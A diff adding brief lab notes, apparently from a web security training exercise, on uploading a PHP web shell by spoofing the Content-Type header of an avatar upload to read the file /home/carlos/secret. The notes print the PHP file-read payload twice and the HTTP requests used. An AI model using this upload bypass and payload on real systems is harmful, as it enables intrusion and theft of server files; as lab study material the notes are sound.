@@ -1,0 +1,27 @@
+Lab #2: Web shell upload via Content-Type restriction bypass
+
+End goal: Submit the contents in /home/carlos/secret
+
+Analysis: 
+
+1. Map the application
+
+2. Exploit update avatar function
+
+GET /files/avatars/images.jpeg HTTP/2
+
+3. Write RCE based on PHP
+
+- Check if it vulnerable to PHP
+
+<?php echo file_get_contents('/home/carlos/secret') ?>
+
+4. Change content-type to images type and upload the php file: 
+
+<?php echo file_get_contents('/home/carlos/secret') ?>
+
+Content-Type: image/jpeg
+
+5. Display the content in /home/carlos/secret
+
+GET /files/avatars/index.php HTTP/2
